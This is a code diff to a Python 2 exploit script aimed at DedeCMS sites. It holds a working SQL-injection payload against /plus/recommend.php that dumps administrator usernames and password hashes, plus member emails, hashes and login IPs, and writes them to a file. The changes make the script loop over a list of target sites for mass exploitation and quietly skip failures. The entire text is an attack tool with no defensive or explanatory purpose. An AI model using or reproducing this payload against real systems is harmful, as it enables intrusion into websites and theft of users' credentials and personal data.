@@ -5,8 +5,10 @@
 import re
 import sys
 import urllib2
+import os
+import urlparse
 
-def getAdminHash(url,i):
+def getAdminHash(url,i,url2):
     urls=url+"/plus/recommend.php?action=&aid=1&_FILES[type][tmp_name]=\%27%20or%20mid=@%60\%27%60%20/*!50000union*//*!50000select*/1,2,3,%28select%20CONCAT%280x7c,userid,0x7c,pwd%29+from+%60%23@__admin%60%20limit+"+str(i)+",1%29,5,6,7,8,9%23@%60\%27%60+&_FILES[type][name]=1.jpg&_FILES[type][type]=application/octet-stream&_FILES[type][size]=111"
     Headers = {"User-Agent":"Mozilla/5.0 (Windows NT 6.1; rv:27.0) Gecko/20100101 Firefox/27.0"}
     #print urls
@@ -18,7 +20,9 @@ def getAdminHash(url,i):
         if result:
             reg = re.compile(r"_(.*?)_{dede",re.S)
             groups = re.findall(reg,result)
+            #print "login url is:%s%s" % (url,url2)
             if groups[0]:
+                print "login url is:%s%s" % (url,url2)
                 print groups[0]
                 with open('%s_admin.txt' % u,'a') as af:
                     af.write(groups[0]+"\n")
@@ -26,6 +30,9 @@ def getAdminHash(url,i):
         print "Precess interrupted by user."
         sys.exit(-1)
 
+    except :
+        #sys.exit(-2)
+        print "no exp"
 
 def getMemberHash(url,i):
     urls = url+"/plus/recommend.php?action=&aid=1&_FILES[type][tmp_name]=\%27%20or%20mid=@%60\%27%60%20/*!50000union*//*!50000select*/1,2,3,%28select%20CONCAT%280x7c,userid,0x7c,email,0x7c,pwd,0x7c,loginip%29+from+%60%23@__member%60%20limit+"+str(i)+",1%29,5,6,7,8,9%23@%60\%27%60+&_FILES[type][name]=1.jpg&_FILES[type][type]=application/octet-stream&_FILES[type][size]=111"
@@ -52,16 +59,22 @@ def getMemberHash(url,i):
 
 
 if __name__ == "__main__":
-    url = raw_input("input dede site:")
+    myfile = open('list.txt','r')
+    filelist = myfile.readlines()
+    for url in filelist:
+        #url = raw_input("input dede site:")
+        #url = sys.argv[1]
+        urld=urlparse.urlparse(url)
+        url1=urld[1]
+        url2=urld[2]
+        if "http://" not in url1:
+            url="http://%s" % url1
 
-    if "http://" not in url:
-        url="http://%s" % url
-
-    print "Admin"
-    for i in xrange(0,20):
-        getAdminHash(url,i)
-    print "Member"
-    for i in xrange(0,2000):
-        getMemberHash(url,i)
+        print "Admin"
+        for i in xrange(0,2):
+            getAdminHash(url,i,url2)
+    #print "Member"
+    #for i in xrange(0,200):
+    #    getMemberHash(url,i)
 
 
